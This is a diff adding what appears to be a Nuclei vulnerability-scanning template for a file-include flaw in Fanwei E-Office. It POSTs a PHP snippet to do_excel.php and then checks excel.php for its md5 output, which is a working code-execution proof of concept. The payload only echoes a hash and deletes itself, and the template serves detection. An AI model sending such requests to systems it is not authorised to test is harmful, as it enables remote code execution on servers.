@@ -1,0 +1,42 @@
+id: poc-yaml-fanwei-e-office-file-include
+info:
+  name: Fanwei E-Office File Include Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: lfi
+  description: |
+    This template detects a file include vulnerability in Fanwei E-Office at the do_excel.php endpoint. The vulnerability allows arbitrary PHP code execution.
+
+variables:
+  v1: "{{rand_text_alphanumeric(8)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: step1
+    method: POST
+    path:
+      - "{{BaseURL}}/general/charge/charge_list/do_excel.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      html=<?php echo md5('{{v1}}');unlink(__FILE__);?>
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: step2
+    method: GET
+    path:
+      - "{{BaseURL}}/general/charge/charge_list/excel.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(v1)}}"
+        part: body
